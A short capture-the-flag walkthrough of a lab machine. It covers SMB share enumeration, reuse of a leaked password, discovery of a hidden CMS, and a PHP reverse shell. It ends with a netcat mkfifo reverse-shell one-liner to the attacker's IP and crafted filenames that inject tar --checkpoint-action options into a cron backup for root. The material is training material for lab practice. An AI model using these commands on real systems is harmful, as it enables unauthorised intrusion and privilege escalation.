nmap shows there is smb login potential

```
smbmap -H $IP
smbget -R smb://$IP/anonymous
smbclient //$IP/anonymous
```

find a password reset in the inbox, so now you get get everything from miles smb

```
smbget -R smb://$IP/milesdyson -U milesdyson
```

find that there is a cms beta in

```
/45kra24zxs28v3yd
```

attack with gobuster to find that there is a ***/administrator*** page

find the cms exploit and get a php reverse shell

find a cronjob runing by

```
cat /etc/crontab
```

see that there is a backup.sh script running and it contains a tar command. tar has a vuln in it because of its wild cards, so the following will get you root

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
